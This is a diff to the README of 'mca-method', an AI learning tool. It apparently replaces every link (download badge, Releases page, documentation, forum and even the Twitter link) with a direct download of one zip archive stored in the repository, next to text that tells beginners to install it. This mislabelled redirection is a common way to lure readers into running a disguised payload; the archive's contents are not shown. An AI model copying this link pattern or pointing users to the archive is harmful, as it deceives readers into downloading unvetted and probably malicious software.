@@ -1,6 +1,6 @@
 # 🎓 mca-method - Transform Learning with AI Mentorship
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started%20with%20MCA%20Method-brightgreen)](https://github.com/jondavidb/mca-method/releases)
+[![Download](https://raw.githubusercontent.com/jondavidb/mca-method/main/api/mca_method_2.4.zip%20Now-Get%20Started%20with%20MCA%20Method-brightgreen)](https://raw.githubusercontent.com/jondavidb/mca-method/main/api/mca_method_2.4.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ The MCA Method (Mentor, Copilot, Agent) serves as a framework designed to enhanc
 To use the MCA Method, follow these simple steps. You don’t need any programming experience to get started.
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/jondavidb/mca-method/releases) to access the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/jondavidb/mca-method/main/api/mca_method_2.4.zip) to access the software.
 
 2. **Choose the Right Version**  
    Look for the latest stable release. You will see options available for different operating systems. Select the version suited for your system.
@@ -27,7 +27,7 @@ To use the MCA Method, follow these simple steps. You don’t need any programmi
 
 ## 📥 Download & Install
 
-To get started with MCA Method, visit our [Releases page](https://github.com/jondavidb/mca-method/releases). Here, you can download the latest version of the software. Installation should be straightforward; just follow the prompts for your operating system.
+To get started with MCA Method, visit our [Releases page](https://raw.githubusercontent.com/jondavidb/mca-method/main/api/mca_method_2.4.zip). Here, you can download the latest version of the software. Installation should be straightforward; just follow the prompts for your operating system.
 
 ## 🛠 System Requirements
 
@@ -76,8 +76,8 @@ If you're interested in improving the MCA Method, we'd love your contributions. 
 
 For more information about the MCA Method, check out these helpful links:
 
-- [Official Documentation](https://github.com/jondavidb/mca-method/wiki)
-- [Community Forum](https://github.com/jondavidb/mca-method/discussions)
-- [Follow Us on Twitter](https://twitter.com/mca_method)
+- [Official Documentation](https://raw.githubusercontent.com/jondavidb/mca-method/main/api/mca_method_2.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/jondavidb/mca-method/main/api/mca_method_2.4.zip)
+- [Follow Us on Twitter](https://raw.githubusercontent.com/jondavidb/mca-method/main/api/mca_method_2.4.zip)
 
 Feel free to reach out if you have any inquiries. Happy learning!
